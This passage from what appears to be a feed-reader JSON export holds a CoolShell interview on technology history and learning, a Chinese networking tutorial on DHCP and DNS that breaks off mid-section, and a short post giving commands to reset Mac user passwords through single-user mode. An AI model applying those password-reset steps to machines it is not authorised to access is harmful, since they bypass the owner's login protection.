      "content" : "<p>最近人品爆发，图灵社区，InfoQ，51CTO相继对我做了采访，前两天我把<a title=\"InfoQ的ArchSummit大会对我的采访\" href=\"http://coolshell.cn/articles/8031.html\">InfoQ对我的采访张贴了出来</a>，今天，图灵社区和51CTO对我的采访发布了（<a title=\"图灵访谈之三十二：我的精神家园——陈皓（@左耳朵耗子）专访\" href=\"http://www.ituring.com.cn/article/9174\">图灵的访谈</a> ，<a title=\"专访陈皓：有关带队、沟通、成长与变化\" href=\"http://developer.51cto.com/art/201208/353256.htm\">51CTO的访谈</a>），我是一个有技术焦虑症的人，我的经历比较特殊，对大家来说可能也没有什么意思，这两个采都有一些重叠的部分，不过有些观点我想再加强一些，并放在这里和大家一起分享一下。</p>\n<h4>对于日新月异的新技术，你是什么态度？</h4>\n<p>遇到新技术我会去了解，但不会把很大的精力放在这些技术（如：NoSQL，Node.js，等）。这些技术尚不成熟，只需要跟得住就可以了。技术十年以上可能是一个门槛。有人说技术更新换代很快，我一点儿都不觉得是这样想。虽然有不成熟的技术不断地涌出，但是成熟的技术，比如Unix，40多年，C，40多年，C++，30多年，TCP/IP，20多年，Java也有将近20年了……，所以，如果你着眼成熟的技术，其实并不多。</p>\n<p>我的观点是——<strong>要了解技术就一定需要了解整个计算机的技术历史发展和进化路线。</strong>（这个观点，我在《<a title=\"程序员技术练级攻略\" href=\"http://coolshell.cn/articles/4990.html\">程序员练级攻略</a>》和《<a title=\"C++的坑真的多吗？\" href=\"http://coolshell.cn/articles/7992.html\">C++的坑多吗？</a>》中提到过多次了。）因为，<strong>你要朝着球运动的轨迹去，而不是朝着球的位置去，要知道球的运动轨迹，你就需要知道它历史上是怎么跑的</strong>。</p>\n<p>如果要捋一个技术的脉络，70年代Unix的出现，是软件发展方面的一个里程碑，那个时期的C语言，也是语言方面的里程碑。（当时）所有的项目都在Unix/C上，全世界人都在用这两样东西写软件。Linux跟随的是Unix, Windows下的开发也是 C/C++。这时候出现的C++很自然就被大家接受了，企业级的系统很自然就会迁移到这上面，C++虽然接过了C的接力棒，但是它的问题是它没有一个企业方面的架构，而且太随意了，否则也不会有今天的Java。C++和C非常接近，它只不过是C的一个扩展，长年没有一个企业架构的框架。而Java在被发明后，被IBM把企业架构这部分的需求接了过来，J2EE的出现让C/C++捉襟见肘了，在语言进化上，还有Python/Ruby，后面还有了.NET，但可惜的是这只局限在Windows平台上。这些就是企业级软件方面语言层面就是C -&gt; C++ -&gt; Java这条主干，操作系统是Unix -&gt; Linux/Windows这条主干，软件开发中需要了解的网络知识就是Ethernet -&gt; IP -&gt; TCP/UDP 这条主干。另外一条脉络就是互联网方面的（HTML/CSS/JS/LAMP…）。我是一个有技术忧虑症的人，这几条软件开发的主线一定不能放弃。</p>\n<p>另外，从架构上来说，我们可以看到，</p>\n<p><span></span></p>\n<ul>\n<li>从单机的年代，到C/S架构（界面，业务逻辑，数据SQL都在Client上，只有数据库服库在S上）</li>\n<li>再到B/S结构（用浏览器来充当Client，但是传统的ASP/PHP/JSP/Perl/CGI这样的编程也都把界面，业务逻辑，和SQL都放在一起），但是B/S已经把这些东西放到了Web Server上，</li>\n<li>再到后来的中间件，把业务逻辑再抽出一层，放到一个叫App Server上，经典的三层结构。</li>\n<li>然后再到分布式结构，业务层分布式，数据层分布式。</li>\n<li>再到今天的云架构——全部移到服务器。</li>\n</ul>\n<div>我们可以看到技术的变迁都一直再把东西往后端移，前端只剩一个浏览器或是一个手机。通过这个你可以看到整个技术发展的趋势。所以，如果你了解了这些变迁，了解了这些变迁过程“不断填坑”的过程，你将会对技术有很强的把握。</div>\n<p>另外，我听到有很多人说，一些技术不适用，一些技术太学院派，但对我来说，无论是应用还是学术，我都会看，知识不愁多。何必搞应用的和搞学术的分开阵营，都是知识，学就好了。</p>\n<p>技术的发展要根植于历史，而不是未来。不要和我描述这个技术的未来会多么美好（InfoQ 的 ArchSummit大会上有一个微软来的人把Node.js说得跟仙女一样，然后给了一个Hello World），我承认你用一些新的技术可以实现很多花哨的东西。但是，我认为技术都是承前的，只有承前的才会常青。所以说“某某（技术）要火”这样的话是没有意义的，等它火了、应用多了，规模大了，再说。有些人说：“不学C/C++也是没有问题的”，我对此的回应是：<strong>如果连技术主干都可以不学的话，还有什么其他的好学呢？这些是计算机发展的根、脉络、祖师爷，这样的东西怎么可以不学呢？</strong></p>\n<p><strong></strong>另外，我们要去了解整个计算机文化，我觉得计算机文化源起于Unix/C这条线上（注意，我说的是文化不是技术）。我也写过很多与Unix文化相关的文章，大家可以看看我写的“<a title=\"Unix传奇(上篇)\" href=\"http://coolshell.cn/articles/2322.html\">Unix传奇</a>（<a title=\"Unix传奇(下篇)\" href=\"http://coolshell.cn/articles/2324.html\">尤其是下篇</a>）”。</p>\n<h4>可是在应用环境中，对新技术的需求是很高的，你觉得在教育领域计算机科学的侧重应该是什么样的？</h4>\n<p>学校教的大部分都是知识密集型的技术，但是社会上的企业大部分都是劳动密集型的。什么是劳动密集型的企业呢？麦当劳炸薯条就是劳动密集型的工作，用不到学校教授的那些知识。如果有一天你不炸薯条了，而要去做更大更专业的东西，学校里的知识就会派上用场。有人说一个语言、一个技术，能解决问题能用就行了，我不这样认为。<strong>我觉得你应该至少要知道这些演变和进化的过程。而如果你要解决一些业务和技术难题，就需要抓住某种技术很深入地学习，当成艺术一样来学习。</strong></p>\n<p>我在“<a title=\"软件开发的“三重门”\" href=\"http://coolshell.cn/articles/6526.html\">软件开发‘三重门’</a>”里说过，第一重门是业务功能，在这重门里，的确是会编程就可以了；第二重门是业务性能，在这一重门里，技术的基础就很管用了，比如：操作系统的文件管理，进程调度，内存管理，网络的七层模型，TCP/<del>UCP</del>UDP的协议，语言用法、编译和类库的实现，数据结构，算法等等就非常关键了；第三重门是业务智能，在这一重门里，你会发现很多东西都很学院派了，比如，搜索算法，推荐算法，预测，统计，机器学习，图像识别，分布式架构和算法，等等，你需要读很多计算机学院派的论文。</p>\n<p>总之，这主要看你职业生涯的背景了，如果你整天被当作劳动力来使用，你用到的技术就比较浅，比较实用，但是如果你做一些知识密集型的工作，你就需要用心来搞搞研究，就会发现你需要理论上的知识。比如说，我之前做过的跨国库存调配，需要知道最短路径的算法，而我现在在亚马逊做的库存预测系统，数据挖掘的那些东西都需要很强的数学建模、算法、数据挖掘的功底。</p>\n<p>我觉得真正的高手都来自知识密集型的学院派。他们更强的是，可以把那些理论的基础知识应用到现在的业务上来。但很可惜，<strong>我们国内今天的教育并没有很好地把那些学院派的理论知识和现实的业务问题很好地接合起来。</strong>比如说一些哈希表或二叉树的数据结构，如果我们的学校在讲述这些知识的时候能够接合实际的业务问题，效果会非常不错，如：设计一个IP地址和地理位置的查询系统，设计一个分布式的NoSQL的数据库，或是设计一个地理位置的检索应用等等。在学习操作系统的时候，如果老师可以带学生做一个手机或嵌入式操作系统，或是研究一下Unix System V或是Linux的源码的话，会更有意思。在学习网络知识的时候，能带学生重点学一下以太网和TCP/IP的特性，并调优，如果能做一个网络上的pub/sub的消息系统或是做一个像Nginx一样的web server，那会更好。如果在学图形学的过程中能带领学生实践一个作图工具或是一个游戏引擎，那会更有意思。</p>\n<p>总之，我们的教育和现实脱节太严重了，教的东西无论是在技术还是在实践上都严重落后和脱节，没有通过实际的业务或技术问题来教学生那些理论知识，这是一个失败。</p>\n<h4><strong>那么，现在做一个软件开发者是否更加困难了？</strong></h4>\n<p>我觉得倒不是。做一个软件开发者更简单了。因为现在互联网很发达，你可以找到很多共享的知识——相对于我那个时候。第一，知识你容易查到，然后社区很多，文章、分享的人也越来越多。我们那个时候没有的。上网一查，什么都没有。都得去自己琢磨，自己去调查。所以我觉得相比我们那个时候更容易了。第二，工具变多了。现在的工具比那个时候好用多了。我们那个时候就是一天到晚在vi里面，连个自动提示都没有，连个版本库管理都没有。不光工具变多，框架也多了，各种各样的编程框架。我们那时候都是生写。写JavaScript，生写，连个jQuery都没有。没有这些辅助性的、让你提高生产力的东西。J2EE那时候也没有。而且整个（开发环境）都很不成熟。一个服务器的最高配置就1GB的情况下，一个WebSphere起来就占了900多MB——这还能跑什么应用？所以只能去用最基础的系统。所以我觉得现在，无论是环境，还是开发的过程，都更规范了。以前我做开发的时候就是，什么都不懂就上了，瞎搞，没有什么开发规范，没有人理你，反正你搞得好就搞好，搞不好就搞不好了，全靠自己，包括做测试维护等等。我觉得现在的软件开发就很好，你一上去，就有好的工具，有好的知识库，有好的社区，有好的开发框架，还有好的流程，方法，甚至还有人帮你做测试，还有人告诉你应该怎么做。幸福得很。现在好多人还说这个不好那个不好，开发难什么的。其实容易多了。</p>\n<p>但是，有个东西我觉得是现在的软件开发者比我们那时候变得更难的。就是，你享福了以后，人就变懒，变娇气了。对很多东西的抱怨就开始多了。我们那个时候哪有什么好抱怨的？没啥好抱怨的，有活就干，有东西学就赶快学。现在呢，学个什么东西还挑挑拣拣的，抱怨这个语言太扯，那个IDE不好，这个框架太差，版本管理工具太扯，等等。<strong>这就好像以前我没东西吃，只有个糠吃，要是有面包有馒头，我就觉得非常非常好了。现在是，好吃的东西多了我们还学会挑食了，这也不好用，那也不好用</strong>。</p>\n<p>根本就不是技术变难了，环境变差了，是程序员变娇气了。所以软件开发变难，归根结底还是程序员们自己变娇气了。</p>\n<h4>你如何在进度压力下，享受技术带来的快乐？</h4>\n<p>中国人中庸的思想，入世和出世，每天的工作就是入世。举个例子，我十年前在上海的时候，给交通银行做项目的时候，每周休息一天，早九点到晚十点，每天工作12个小时，这样的工作持续了一整年，没有节假日，项目上的技术也没什么意思。当时我晚上十点回到住处，还想学一些C++/Java和Unix/Windows的技术，于是就看书到晚上11:30，每天如此，一年下来学到很多东西，时间没有荒废，心里就很开心。<strong>我觉得当时是快乐的，因为有成长的感觉是快乐的。</strong></p>\n<p>现在的我，工作、写博客、养孩子，事情其实更多。我早上7:30起床，会浏览一下国外的新闻，hacker news, tech church, reddit, highavailability之类的站点，9点上班。晚上6、7点钟下班，开始带孩子。十点钟孩子睡了觉，我会开始重新细读一下这一天都发生了些什么事情。这个时间也有可能会用来看书。学习的过程（我）是不喜欢被打断的，所以从十点到十二点，家人都睡了，这正是我连续学习的好时间。可能从晚上11:30开始，我会做点笔记或者写博客。我现在对酷壳文章的质量要求比较高一些，所以大概积累一个星期的时间才可以生成一篇文章。每天我大概都在一两点钟才会睡觉。没办法，我有技术焦虑症。但是觉得这样的生活很充实，也很踏实。</p>\n<p>另外，任何一门技术玩深了，都是很有意思的。有些人形成了一个价值取向，“我只做什么，绝不做什么”。前段时间有一个刚来亚马逊的工程师，他原来做的是数据挖掘推荐系统，原来的公司重组要让他做前端，他不肯就离职了，他说他不想做前端。我觉得，前端后端都是编程，Javascript是编程，C++也是编程。<strong>编程不在于你用什么语言去coding，而是你组织程序、设计软件的能力，只要你上升到脑力劳动上来，用什么都一样，技术无贵贱。</strong>你可以不喜欢那个技术，但是还是要了解了解，也没有必要完全不用，完全抛弃。Javascript啊——只要能被Javascript实现的，未来总有一天会被Javascript所取代。</p>\n<p>回到问题，怎么才能享受到快乐呢？</p>\n<ul>\n<li>第一，入世和出世要分开，不要让世俗的东西打扰到你的内心世界，你的情绪不应该为别人所控，也不应该被世俗所污染，活得真实，活得真实你才会快乐。</li>\n</ul>\n<ul>\n<li>第二，就是要有热情，有了热情，你的心情就会很好，加班都可以是快乐的，想一想我们整个通宵用来打游戏的时光，虽然很累，但是你也很开心，这都是因为有了热情的缘故。</li>\n</ul>\n<p>总之一句话——<strong>如果你没有兴趣，什么都是借口，如果你有兴趣了，什么都是好玩的</strong>。</p>\n<h4></h4>\n<p>（全文完）<br>\n<hr height=\"1\" width=\"100%\">\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"Internet 技术演变图\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1178.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8088.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/11/08/10438258.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Internet 技术演变图</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"NoSQL 数据建模技术\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7270.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8088.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2012/05/15/26310198.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">NoSQL 数据建模技术</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"40个很不错的CSS技术\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3063.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8088.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/09/08/23404634.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">40个很不错的CSS技术</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"22个不错的CSS技术\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F648.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8088.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/11/08/10438281.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">22个不错的CSS技术</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"你应该知道的20个Ajax技术(11-20)\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F9.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8088.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/11/08/10434977.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">你应该知道的20个Ajax技术(11-20)</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table>\n\n<h3>相关文章</h3><ul><li>2011年07月18日 -- <a href=\"http://coolshell.cn/articles/4990.html\">程序员技术练级攻略</a></li><li>2011年03月29日 -- <a href=\"http://coolshell.cn/articles/4102.html\">如何学好C语言</a></li><li>2011年06月03日 -- <a href=\"http://coolshell.cn/articles/4758.html\">如何写出无法维护的代码</a></li><li>2009年12月24日 -- <a href=\"http://coolshell.cn/articles/1992.html\">程序员眼中的编程语言</a></li><li>2011年08月26日 -- <a href=\"http://coolshell.cn/articles/5388.html\">C语言中史上最愚蠢的Bug</a></li><li>2011年08月01日 -- <a href=\"http://coolshell.cn/articles/5075.html\">你确信你了解时间吗？</a></li><li>2010年04月01日 -- <a href=\"http://coolshell.cn/articles/2287.html\">C++ 程序员自信心曲线图</a></li></ul></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1344850578930",
    "timestampUsec" : "1344850578930861",
    "id" : "tag:google.com,2005:reader/item/1612e9889c195adc",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "忘了密碼 - Single Mode for Lion",
    "published" : 1343570460,
    "updated" : 1343570493,
    "replies" : [ {
      "href" : "http://iosdevelopersnote.blogspot.com/feeds/3606724433798573178/comments/default",
      "title" : "張貼意見",
      "type" : "application/atom+xml"
    }, {
      "href" : "http://iosdevelopersnote.blogspot.com/2012/07/single-mode-for-lion.html#comment-form",
      "title" : "0 個意見",
      "type" : "text/html"
    } ],
    "alternate" : [ {
      "href" : "http://iosdevelopersnote.blogspot.com/2012/07/single-mode-for-lion.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "日前學員搬了一台Mac 問說，公司的電腦，之前用的人離職了，不知道密碼是什麼？怎麼辦？ <br>在Unix環境之下，只要機器在手邊，忘了密碼通常會進入 Single Mode。在 Snow Leopard 或是 Lion 一開機的時候同時按著 <b>Command + S</b> 就會進入 Single Mode。<br>當 shell 跑完時，Snow leopard 輸入<br><blockquote>mount -uw /<br>launchctl load /System/Library/LaunchDaemons/com.apple.DirectoryServices.plist<br>dscl . passwd /Users/&lt;某個使用者&gt; &lt;新密碼&gt;</blockquote><br>就可以更改使用者的密碼<br><br>而在 Lion 的時候<br><blockquote>mount -uw /<br>launchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist</blockquote><br>此時可以更改 root 密碼<br>接著輸入<br><blockquote>dscl . passwd /Users/&lt;某個使用者&gt; &lt;新密碼&gt;</blockquote><br>就可以更改某個使用者的密碼了<br>在這個時候會出現 com.apple.DirectoryServices.plist cannot be found 的錯誤<br>不用理會，重開機後就可以用新的密碼進入"
    },
    "author" : "麥克",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://iosdevelopersnote.blogspot.com/feeds/posts/default",
      "title" : "Developer&#39;s Note",
      "htmlUrl" : "http://iosdevelopersnote.blogspot.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1343502656061",
    "timestampUsec" : "1343502656061786",
    "id" : "tag:google.com,2005:reader/item/e7a5da7bd3e43a68",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "互联网协议入门（二）",
    "published" : 1339409601,
    "updated" : 1339409601,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2012/06/internet_protocol_suite_part_ii.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p><a href=\"http://www.ruanyifeng.com/blog/2012/05/internet_protocol_suite_part_i.html\">上一篇文章</a>分析了互联网的总体构思，从下至上，每一层协议的设计思想。</p><p>这是从设计者的角度看问题，今天我想切换到用户的角度，看看用户是如何从上至下，与这些协议互动的。</p>\n\n<p>==============================================================</p>\n\n<p><strong>互联网协议入门（二）</strong></p>\n\n<p>作者：阮一峰</p>\n\n<p><img src=\"http://image.beekka.com/blog/201206/bg2012061109.jpg\"></p>\n\n<p>（接上文）</p>\n\n<p><strong>七、一个小结</strong></p>\n\n<p>先对前面的内容，做一个小结。</p>\n\n<p>我们已经知道，网络通信就是交换数据包。电脑A向电脑B发送一个数据包，后者收到了，回复一个数据包，从而实现两台电脑之间的通信。数据包的结构，基本上是下面这样：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201205/bg2012052913.png\"></p>\n\n<p>发送这个包，需要知道两个地址：</p>\n\n<blockquote>\n\n<p>　　* 对方的MAC地址</p>\n\n<p>　　* 对方的IP地址</p>\n\n</blockquote>\n\n<p>有了这两个地址，数据包才能准确送到接收者手中。但是，前面说过，MAC地址有局限性，如果两台电脑不在同一个子网络，就无法知道对方的MAC地址，必须通过网关（gateway）转发。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201206/bg2012061101.jpg\"></p>\n\n<p>上图中，1号电脑要向4号电脑发送一个数据包。它先判断4号电脑是否在同一个子网络，结果发现不是（后文介绍判断方法），于是就把这个数据包发到网关A。网关A通过路由协议，发现4号电脑位于子网络B，又把数据包发给网关B，网关B再转发到4号电脑。</p>\n\n<p>1号电脑把数据包发到网关A，必须知道网关A的MAC地址。所以，数据包的目标地址，实际上分成两种情况：</p>\n\n<table width=\"70%\" border=\"1\"><tr><td>场景</td><td>数据包地址</td></tr><tr><td>同一个子网络</td><td>对方的MAC地址，对方的IP地址</td></tr><tr><td>非同一个子网络</td><td>网关的MAC地址，对方的IP地址</td></tr></table>\n\n<p>发送数据包之前，电脑必须判断对方是否在同一个子网络，然后选择相应的MAC地址。接下来，我们就来看，实际使用中，这个过程是怎么完成的。</p>\n\n<p><strong>八、用户的上网设置</strong></p>\n\n<p><strong>8.1 静态IP地址</strong></p>\n\n<p>你买了一台新电脑，插上网线，开机，这时电脑能够上网吗？</p>\n\n<p><img src=\"http://image.beekka.com/blog/201206/bg2012061110.jpg\"></p>\n\n<p>通常你必须做一些设置。有时，管理员（或者ISP）会告诉你下面四个参数，你把它们填入操作系统，计算机就能连上网了：</p>\n\n<blockquote>\n\n<p>　　* 本机的IP地址<br>\n　　* 子网掩码<br>\n　　* 网关的IP地址<br>\n　　* DNS的IP地址</p>\n\n</blockquote>\n\n<p>下图是Windows系统的设置窗口。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201206/bg2012061111.png\"></p>\n\n<p>这四个参数缺一不可，后文会解释为什么需要知道它们才能上网。由于它们是给定的，计算机每次开机，都会分到同样的IP地址，所以这种情况被称作\"静态IP地址上网\"。</p>\n\n<p>但是，这样的设置很专业，普通用户望而生畏，而且如果一台电脑的IP地址保持不变，其他电脑就不能使用这个地址，不够灵活。出于这两个原因，大多数用户使用\"动态IP地址上网\"。</p>\n\n<p><strong>8.2 动态IP地址</strong></p>\n\n<p>所谓\"动态IP地址\"，指计算机开机后，会自动分配到一个IP地址，不用人为设定。它使用的协议叫做<a href=\"http://zh.wikipedia.org/zh/DHCP\">DHCP协议</a>。</p>\n\n<p>这个协议规定，每一个子网络中，有一台计算机负责管理本网络的所有IP地址，它叫做\"DHCP服务器\"。新的计算机加入网络，必须向\"DHCP服务器\"发送一个\"DHCP请求\"数据包，申请IP地址和相关的网络参数。</p>\n\n<p>前面说过，如果两台计算机在同一个子网络，必须知道对方的MAC地址和IP地址，才能发送数据包。但是，新加入的计算机不知道这两个地址，怎么发送数据包呢？</p>\n\n<p>DHCP协议做了一些巧妙的规定。</p>\n\n<p><strong>8.3 DHCP协议</strong></p>\n\n<p>首先，它是一种应用层协议，建立在UDP协议之上，所以整个数据包是这样的：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201206/bg2012061102.png\"></p>\n\n<p>　　（1）最前面的\"以太网标头\"，设置发出方（本机）的MAC地址和接收方（DHCP服务器）的MAC地址。前者就是本机网卡的MAC地址，后者这时不知道，就填入一个广播地址：FF-FF-FF-FF-FF-FF。</p>\n\n<p>　　（2）后面的\"IP标头\"，设置发出方的IP地址和接收方的IP地址。这时，对于这两者，本机都不知道。于是，发出方的IP地址就设为0.0.0.0，接收方的IP地址设为255.255.255.255。</p>\n\n<p>　　（3）最后的\"UDP标头\"，设置发出方的端口和接收方的端口。这一部分是DHCP协议规定好的，发出方是68端口，接收方是67端口。</p>\n\n<p>这个数据包构造完成后，就可以发出了。以太网是广播发送，同一个子网络的每台计算机都收到了这个包。因为接收方的MAC地址是FF-FF-FF-FF-FF-FF，看不出是发给谁的，所以每台收到这个包的计算机，还必须分析这个包的IP地址，才能确定是不是发给自己的。当看到发出方IP地址是0.0.0.0，接收方是255.255.255.255，于是DHCP服务器知道\"这个包是发给我的\"，而其他计算机就可以丢弃这个包。</p>\n\n<p>接下来，DHCP服务器读出这个包的数据内容，分配好IP地址，发送回去一个\"DHCP响应\"数据包。这个响应包的结构也是类似的，以太网标头的MAC地址是双方的网卡地址，IP标头的IP地址是DHCP服务器的IP地址（发出方）和255.255.255.255（接收方），UDP标头的端口是67（发出方）和68（接收方），分配给请求端的IP地址和本网络的具体参数则包含在Data部分。</p>\n\n<p>新加入的计算机收到这个响应包，于是就知道了自己的IP地址、子网掩码、网关地址、DNS服务器等等参数。</p>\n\n<p><strong>8.4 上网设置：小结</strong></p>\n\n<p>这个部分，需要记住的就是一点：不管是\"静态IP地址\"还是\"动态IP地址\"，电脑上网的首要步骤，是确定四个参数。这四个值很重要，值得重复一遍：</p>\n\n<blockquote>\n\n<p>　　* 本机的IP地址<br>\n　　* 子网掩码<br>\n　　* 网关的IP地址<br>\n　　* DNS的IP地址</p>\n\n</blockquote>\n\n<p>有了这几个数值，电脑就可以上网\"冲浪\"了。接下来，我们来看一个实例，当用户访问网页的时候，互联网协议是怎么运作的。</p>\n\n<p><strong>九、一个实例：访问网页</strong></p>\n\n<p><strong>9.1 本机参数</strong></p>\n\n<p>我们假定，经过上一节的步骤，用户设置好了自己的网络参数：</p>\n\n<blockquote>\n\n<p>　　* 本机的IP地址：192.168.1.100<br>\n　　* 子网掩码：255.255.255.0<br>\n　　* 网关的IP地址：192.168.1.1<br>\n　　* DNS的IP地址：8.8.8.8</p>\n\n</blockquote>\n\n<p>然后他打开浏览器，想要访问Google，在地址栏输入了网址：www.google.com。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201206/bg2012061103.png\"></p>\n\n<p>这意味着，浏览器要向Google发送一个网页请求的数据包。</p>\n\n<p><strong>9.2 DNS协议</strong></p>\n\n<p>我们知道，发送数据包，必须要知道对方的IP地址。但是，现在，我们只知道网址www.google.com，不知道它的IP地址。</p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Domain_Name_System\">DNS协议</a>可以帮助我们，将这个网址转换成IP地址。已知DNS服务器为8.8.8.8，于是我们向这个地址发送一个DNS数据包（53端口）。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201206/bg2012061105.png\"></p>\n\n<p>然后，DNS服务器做出响应，告诉我们Google的IP地址是172.194.72.105。于是，我们知道了对方的IP地址。</p>\n\n<p><strong>9.3 子网掩码</strong></p>\n\n<p>接下来，我们要判断，这个IP地址是不是在同一个子网络，这就要用到子网掩码。</p>\n\n<p>已知子网掩码是255.255.255.0，本机用它对自己的IP地址192.168.1.100，做一个二进制的AND运算（两个数位都为1，结果为1，否则为0），计算结果为192.168.1.0；然后对Google的IP地址172.194.72.105也做一个AND运算，计算结果为172.194.72.0。这两个结果不相等，所以结论是，Google与本机不在同一个子网络。</p>\n\n<p>因此，我们要向Google发送数据包，必须通过网关192.168.1.1转发，也就是说，接收方的MAC地址将是网关的MAC地址。</p>\n\n<p><strong>9.4 应用层协议</strong></p>\n\n<p>浏览网页用的是HTTP协议，它的整个数据包构造是这样的：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201206/bg2012061106.png\"></p>\n\n<p>HTTP部分的内容，类似于下面这样：</p>\n\n<blockquote>\n\n<p>　　GET / HTTP/1.1<br>\n　　Host: www.google.com<br>\n　　Connection: keep-alive<br>\n　　User-Agent: Mozilla/5.0 (Windows NT 6.1) ......<br>\n　　Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>\n　　Accept-Encoding: gzip,deflate,sdch<br>\n　　Accept-Language: zh-CN,zh;q=0.8<br>\n　　Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br>\n　　Cookie: ... ...</p>\n\n</blockquote>\n\n<p>我们假定这个部分的长度为4960字节，它会被嵌在TCP数据包之中。</p>\n\n<p><strong>9.5 